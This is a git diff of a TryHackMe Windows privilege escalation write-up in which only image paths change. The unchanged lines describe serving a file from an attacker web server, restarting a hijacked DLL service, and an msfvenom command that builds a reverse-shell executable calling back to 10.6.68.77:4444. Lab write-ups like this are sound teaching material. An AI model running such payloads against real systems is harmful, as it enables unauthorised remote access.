@@ -74,7 +74,7 @@ We add the above code into a .c file then we can compile it.
 
 Now we get the file onto the machine via whatever means we can. I'll be adding it by using a simple python web server. `python3 -m http.server` onmy attacker machine.
 
-![](<../../../.gitbook/assets/image (102) (1) (1).png>)
+![](<../../../.gitbook/assets/image (102) (1).png>)
 
 Now we stop and start the DLL service with: `sc stop dllsvc` followed by `sc start dllsvc`
 
@@ -116,7 +116,7 @@ Then we get the file contents: `Get-Content 'C:\Users\jack\Documents\flagdll.txt
 
 `THM-636729273483` - The room gives us an example payload to create a file to upload to the system. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.68.77 LPORT=4444 -f exe > common.exe`
 
-![](<../../../.gitbook/assets/image (111) (1).png>)
+![](<../../../.gitbook/assets/image (111).png>)
 
 Now we start metasploit and get our listener ready `msfconsole -q`
 
